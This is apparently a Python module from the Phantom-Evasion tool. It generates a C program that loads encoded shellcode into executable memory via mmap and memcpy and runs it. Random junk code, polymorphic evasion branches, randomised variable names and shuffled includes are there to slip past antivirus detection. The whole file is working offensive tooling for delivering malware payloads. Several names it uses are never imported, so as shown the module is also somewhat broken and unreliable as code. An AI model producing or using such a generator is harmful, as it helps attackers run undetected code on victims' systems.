
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import readpayload_exfile

Payload = readpayload_exfile()

Filename = sys.argv[1]  #unused

Encryption = sys.argv[2]

Randbufname = varname_creator()

DecodeKit = encoding_manager(Encryption,Payload,Randbufname)

Payload = DecodeKit[0]     # encoded shellcode 

DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

Randmem = varname_creator()

Randptr = varname_creator()

Randinj = varname_creator()

Junkcode_01 = Junkmathinject()
Junkcode_02 = Junkmathinject()
Junkcode_03 = Junkmathinject()
Junkcode_04 = Junkmathinject()
Junkcode_05 = Junkmathinject()
Junkcode_06 = Junkmathinject()
Junkcode_07 = Junkmathinject()
Junkcode_08 = Junkmathinject()
Junkcode_09 = Junkmathinject()
Junkcode_10 = Junkmathinject()
Junkcode_11 = Junkmathinject()
Junkcode_12 = Junkmathinject()
Junkcode_13 = Junkmathinject()
Junkcode_14 = Junkmathinject()
Junkcode_15 = Junkmathinject()

MorphEvasion1 = Polymorph_Multipath_Evasion()
MorphEvasion2 = Polymorph_Multipath_Evasion()
MorphEvasion3 = Polymorph_Multipath_Evasion()

Hollow_code = ""

Include_List = ["#include <stdlib.h>\n","##include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]

random.shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += MorphEvasion1
Hollow_code += Junkcode_02
Hollow_code += MorphEvasion2
Hollow_code += Junkcode_03
Hollow_code += MorphEvasion3
Hollow_code += Junkcode_04
Hollow_code += Payload
Hollow_code += Junkcode_05
Hollow_code += "void *" + Randptr + ";"
Hollow_code += Junkcode_06
Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
Hollow_code += Junkcode_07
Hollow_code += Junkcode_08
Hollow_code += Junkcode_09
Hollow_code += Junkcode_10
if DecoderStub != "False":
    Hollow_code += DecoderStub
Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
Hollow_code += Junkcode_11
Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
Hollow_code += "else{" + Junkcode_12 + "}\n"
Hollow_code += "}else{" + Junkcode_13 + "}\n"
Hollow_code += "}else{" + Junkcode_14 + "}\n"
Hollow_code += Junkcode_15
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)

